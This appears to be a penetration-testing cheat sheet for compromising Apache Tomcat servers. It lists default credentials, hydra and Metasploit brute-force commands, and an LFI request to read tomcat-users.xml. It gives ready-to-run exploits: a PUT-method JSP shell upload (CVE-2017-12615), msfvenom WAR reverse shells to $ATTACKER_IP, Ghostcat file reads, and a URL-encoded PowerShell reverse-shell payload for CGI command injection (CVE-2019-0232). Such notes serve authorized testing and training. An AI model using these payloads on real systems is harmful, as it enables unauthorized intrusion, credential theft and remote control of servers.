- Always check /cgi/ for .bat/.cmd scripts
- metasploit `exploit/multi/http/tomcat_cgi_cmdlineargs`

### <span style="color:#50FA7B">Key Files</span>
- `conf/tomcat-users.xml` - Contains users and roles
- `webapps/APP/WEB-INF/web.xml` - Application configuration
- `webapps/APP/WEB-INF/classes/` - Compiled Java classes


### <span style="color:#50FA7B">Default credentials:</span>
- `tomcat:tomcat`
- `admin:admin`
- `role1:role1`
- `both:tomcat`

```bash
# Brute Force 
hydra -L users.txt -P passwords.txt target http-get /manager/html

# Extract Credentials from tomcat-users.xml If you have LFI:
curl http://target/vuln.jsp?file=../../../../conf/tomcat-users.xml

# CVE-2017-12615 (PUT Method RCE)
curl -X PUT http://target:8080/shell.jsp/ -d @shell.jsp
```

## <span style="color:#8BE9FD">Reverse Shell (After login)</span>
```bash
# Create JSP shell:
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ATTACKER_IP LPORT=4444 -f war > shell.war

# Alternative JSP Shell
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r shell.war cmd.jsp
```
- Access /manager/html
- Upload WAR file
- Access deployed shell at /shell/


### <span style="color:#50FA7B">Brute Force Attacks</span>
- msfconsole
```bash
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS $VICTIM_IP
set RPORT <port>
set STOP_ON_SUCCESS true
set VHOST <domain_if_needed>
run
```
- python script
```bash
python3 tomcat_brute.py -U http://target:8080 -P /manager/html -u users.txt -p passwords.txt
```
 
 ## Ghostcat Exploit (CVE-2020-1938)
 ```bash
 # Exploit (LFI)
 # https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi
 python2 tomcat-ajp-lfi.py target -p 8009 -f WEB-INF/web.xml
```


## <span style="color:#8BE9FD">Tomcat CGI RCE (CVE-2019-0232)</span>
#### <span style="color:#FFB86C">Vulnerability Overview</span>
- Affects: Apache Tomcat 9.0.0.M1 to 9.0.17, 8.5.0 to 8.5.39, 7.0.0 to 7.0.93
- Impact: RCE on Windows when enableCmdLineArguments=true (default in older versions).
- Root Cause: Improper input validation in CGI Servlet → OS command injection.

#### <span style="color:#FFB86C">1. Find CGI Scripts</span>
```bash
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://$VICTIM_IP:8080/cgi/FUZZ.bat
```
- Common extensions: .bat, .cmd (Windows)

#### <span style="color:#FFB86C">2. Exploitation</span>
#### <span style="color:#FFB86C">Step 1: Verify CGI Execution</span>
```bash
http://$VICTIM_IP:8080/cgi/welcome.bat?&dir
```
#### <span style="color:#FFB86C">Step 2: Bypass Filtering</span>
- Problem: Tomcat blocks special chars (\, :, etc.).
- Solution: URL-encode the payload:
```bash
http://$VICTIM_IP:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```
- Decodes to: c:\windows\system32\whoami.exe

#### <span style="color:#FFB86C">Step 3: Execute Arbitrary Commands</span>
- Reverse Shell (PowerShell):
```bash
http://$VICTIM_IP:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5CWindowsPowerShell%5Cv1.0%5Cpowershell.exe+-nop+-c+"$client+=New-Object+System.Net.Sockets.TCPClient('$ATTACKER_IP',4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne0){;$data=(New-Object-Text.ASCIIEncoding).GetString($bytes,0,$i);$sb=(iex+$data+2>&1|Out-String);$sb2=$sb+'PS+'+$(pwd).Path+'>+';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$stream.Write($sbt,0,$sbt.Length);$stream.Flush()};$client.Close()"
```


##### <span style="color:#FFB86C">Roles explained:</span>
- `manager-gui`: access /manager/html
- `manager-script`: HTTP API access
- `manager-status`: status page only
- `admin-gui`: full admin access